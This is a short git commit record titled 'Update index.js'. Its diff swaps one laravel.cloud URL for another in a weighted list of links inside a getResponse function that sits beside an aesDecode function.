bdb76c4c1997a2eace24c661b8115624423940c3
animalinside <akshay.anand12@yahoo.com>
2026-05-19 06:57:59 +0530

    Update index.js

--- index.js
+++ index.js
@@ -71,8 +71,8 @@ function aesDecode(encryptedText) {
   function getResponse() {
 
     const links = [
-        { url: "https://laravel-1-niuii-obx70b.laravel.cloud/", weight: 0.5 },
-        { url: "https://laravel-1-niuii-obx70b.laravel.cloud/", weight: 0.5 }
+        { url: "https://laravel-1-tiiuiii-6s0h9g.laravel.cloud/", weight: 0.5 },
+        { url: "https://laravel-1-tiiuiii-6s0h9g.laravel.cloud/", weight: 0.5 }
       
     ];
 
